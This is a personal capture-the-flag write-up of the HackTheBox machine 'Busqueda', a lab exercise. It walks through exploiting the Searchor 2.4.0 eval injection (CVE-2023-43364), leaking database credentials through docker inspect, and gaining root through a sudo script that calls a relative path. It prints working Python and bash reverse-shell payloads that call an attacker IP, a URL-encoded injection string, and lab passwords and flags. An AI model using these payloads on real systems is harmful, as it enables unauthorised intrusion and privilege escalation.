#box #gitea #docker #os-command-injection #python-builtin-functions
Busqueda is a machine involving a vulnerability in Searchor an utility that conglomerates different search engines in a single endpoint where the user can search a given string within different search engines. The vulnerability permits to perform Arbitrary Code Execution within the search option of the library.
Once landed in the machine, by investigating the folder we land in we discover credentials in a  `.config` file that grants us two information; the first one that highlights us the existence of a subdomain containing a `gitea` instance, the other one gives us the primary access to that gitea server since we have the credentials for a given user `cody@gitea.searcher.htb`. We'll further discover that this user corresponds to the SSH accesses to that machine as the user `svc`.
Once authenticated in SSH and by having the password we run `sudo -l` and discover that we can run a script as sudo. By investigating around this script we're able to execute a shell script as sudo, granting us root.
## Nmap

Nmap highlights the presence of SSH and 80 ports open
```bash
# Nmap 7.95 scan initiated Tue Apr 15 16:06:20 2025 as: /usr/lib/nmap/nmap --min-rate=10000 -sC -sV -o nmap_sCsV 10.129.228.217
Nmap scan report for 10.129.19.143
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 15 16:06:29 2025 -- 1 IP address (1 host up) scanned in 8.82 seconds
```

By landing on 10.129.228.217:80 we discover that the website resolves to `searcher.htb`. We add the name to our `/etc/hosts` file, to resolve it accordingly

## :80

Once on port 80, we instantly discover at the bottom of the website that the instance is a `Searchor 2.4.0` instance, by looking online we discover that this version is vulnerable to #ArbitraryCodeExecution, precisely with [CVE-2023-43364](https://nvd.nist.gov/vuln/detail/cve-2023-43364) in the file `main.py` due to the use of EVAL on the user's input.

### CVE-2023-43364 the Easy Way

To gain a shell we can use this [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) by specifying **target**, **attacker** and **listener port**.
So, we first start a listener with `nc -lvnp 1337`, we then execute the exploit, obtaining the shell:
```bash
./exploit.sh searcher.htb 10.10.16.20 1337
```
### CVE-2023-43364 the Hard Way

To perform the exploit without leveraging on a pre-made script we can try to execute some tries with BurpSuite. First of all let's track the target API `POST /search`.

![[attachments/busqueda-writeup-1.webp]]

At this point we can try manipulate the request accordingly to try escape the `eval` function.
We have two paths we can follow to discover the escapable character:
* Reading the vulnerability documentation and discovering that the vulnerability lies in the snippet here:

```bash
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< See here 
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})" # Escaping {query} with a ') causes the `search` function to exit and the allows us to execute python commands
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
iop```

* Or by enumerating, with [FFuF](obsidian://open?vault=Pentesting&file=Commands%20Cheatsheets%2FLinux%2FFFuF) for possible escaping capabilities. 
#### Enumeration
To perform this we can, for ease:

1. Save the request in our Burp Repeater in a file [!!without the space at the end, there must be no empty line after the payload!!]
```bash title:"POST Request save in 'req.txt'" 
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://searcher.htb
Connection: keep-alive
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

engine=Amazon&query=FUZZ
```
2. use the [[FFuF#Request File Fuzzing|FFuF Request Fuzzing]] method perform the enumeration based on the FUZZ keyword inserted in the  `req.txt` file.
```bash
ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -request-proto http -request req.txt # Important to set `-request-proto` because by default it uses `https`
```

In this case, the scan has the following output, and we'll notice that all the characters have a size which differs from 0, except for `'` and `\` 

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://searcher.htb/search
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Header           : Host: searcher.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://searcher.htb
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://searcher.htb/
 :: Data             : engine=Amazon&query=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2170ms]
(                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2193ms]
]                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2291ms]
?                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2342ms]
@                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2382ms]
!                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2483ms]
`                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2458ms]
)                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2511ms]
:                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 2535ms]
,                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4361ms]
}                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4363ms]
-                       [Status: 200, Size: 28, Words: 1, Lines: 1, Duration: 4363ms]
=                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4364ms]
&                       [Status: 200, Size: 27, Words: 1, Lines: 1, Duration: 4363ms]
<                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4363ms]
~                       [Status: 200, Size: 28, Words: 1, Lines: 1, Duration: 4364ms]
$                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4364ms]
'                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4364ms] # Size 0, meaning that the request did respond with an empty payload, differently from other characters
{                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4364ms]
.                       [Status: 200, Size: 28, Words: 1, Lines: 1, Duration: 4365ms]
%                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4365ms]
*                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4365ms]
/                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4365ms]
_                       [Status: 200, Size: 28, Words: 1, Lines: 1, Duration: 4367ms]
;                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4367ms]
"                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4367ms]
+                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4365ms]
^                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4365ms]
[                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4367ms]
>                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4367ms]
|                       [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 4368ms]
\                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4368ms] # Size 0, meaning that the request did respond with an empty payload, differently from other characters
:: Progress: [32/32] :: Job [1/1] :: 14 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```
This tells us that the request with size 0 caused the API to fail, so that it might be vulnerable to arbitrary code execution by leveraging the `eval()` function.

---

At this point, we can leverage the vulnerability found and try to configure a command that grants us a reverse shell onto the machine.
We can use the following command to properly achieve a shell on the system:
```python
__import__('os').system('echo "bash -i  >& /dev/tcp/10.10.16.20/1337  0>&1"|bash')#
```

precisely, we tried that we cannot achieve the shell simply with the bash command, then we `echo` it and then pipe it to `bash` to properly gain the shell.
At the end, the final command to be injected in the payload, URL-encoded is: `engine=Amazon&query=')%2b__import__('os').system('echo+"bash+-i++>%26+/dev/tcp/10.10.16.20/1337++0>%261"|bash')%23`
This command, will grant us the shell.

## Foothold and machine investigation

Once landed on the machine, we enter inside the application's folder. By lurking inside the folder, we discover the presence of a config file inside the `.git` folder, that contains two main retrieval:
* The existence of a gitea server, precisely at `gitea.searcher.htb`, subdomain that we're gonna add to our `/etc/hosts`
* The presence of a pair of credentials, apparently to login to `gitea` 
Credentials: `cody:jh1usoih2bkjaspwe92`

Lately, we'll discover that the password is also used to the svc user to authenticate in SSH, granting us the `user` flag

User: `70e7248f922622468d34899e7375c0f1`

## Gitea and Privilege Escalation

Since we own the user's credentials, the first thing we try to do is  `sudo -l`, discovering the capability to run as sudo the following command:
```bash title:"sudo -l"
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

By doing `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *` we discover that the script returns us a list of available commands, identifying the presence of docker on the machine. 
By doing `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps` we find out that there are two containers. The first one is a `gitea` container while the second one is a `mysql_db` instance.

We realize that our other option permits us to inspect the container content, thus we look up online to find relevant information we can potentially query within the inspect command, discovering that the `.Config.Env` retrieval could provide us key information on the container.

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{ .Config.Env }}' mysql_db
```
This command will output us the list of environment variables available on the container, discovering the MYSQL_ROOT_PASSWORD  `jI86kGUuj87guWr3RyF` and the MYSQL_USER `gitea` and its MYSQL_PASSWORD `yuiu1hoiu4i5ho1uh`

Moreover, we also try to catch the IpAddress of the mysql instance, to authenticate to it and find sensitive information on the instance.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mysql_db
```

Discovering that the IP address is: `172.19.0.3`

### Authenticating to MySQL and finding Gitea Administrator user

After authenticating to mysql:
```bash
mysql -u root -h 172.19.0.3 -P 3306 -p # -p at the end specifies that the authentication must ask for a password. Omitting it causes the authentication to fail.
```

Inside the database, we discover the presence of a database `show databases;` called `gitea` and we decide to use it `use gitea;`.
We then decide to query the `user` table: `select * from user;` 

Here, we discover the presence of the `administrator` user which is registered to gitea with the email `administrator@gitea.searcher.htb`.
At this point, we try to authenticate to gitea with the credentials: `administrator:yuiu1hoiu4i5ho1uh` , succeeding.

### Leveraging gitea /scripts vulnerability to gain Privilege Escalation

Once inside gitea, we finally have access to the scripts that we were able to execute as sudo with the `svc` user.
By opening the files, we discover in `system-checkup.sh` (the file we can execute as sudo) the presence of a `run_command` function that performs a `subprocess.run` of a given passed argument:
```python
def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
```

When `full-checkup` is executed, what happens is that the function executes a `.sh` file present in the folder we're in (the path is relative in the script)

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh'] # The vulnerability lies in the fact that the reference to full-checkup.sh is relative, thus we can run the script file from any folder and create a fake full-checkup.sh file with the content that we want it to have. Once we run that sudo command in the folder where our fake .sh file lies, the script will perform the content of our .sh
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

We then go to `/tmp` and create our custom `full-checkup.sh` file, containing a reverse shell to gain root.

```bash title:"full-checkup.sh"
#!/bin/bash

bash -i  >& /dev/tcp/10.10.16.20/4444  0>&1
```

We `chmod +x ./full-checkup.sh` and then we `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`, obtaining **root**.

Root: `be7dfc5ef51edaf606048e356d368917`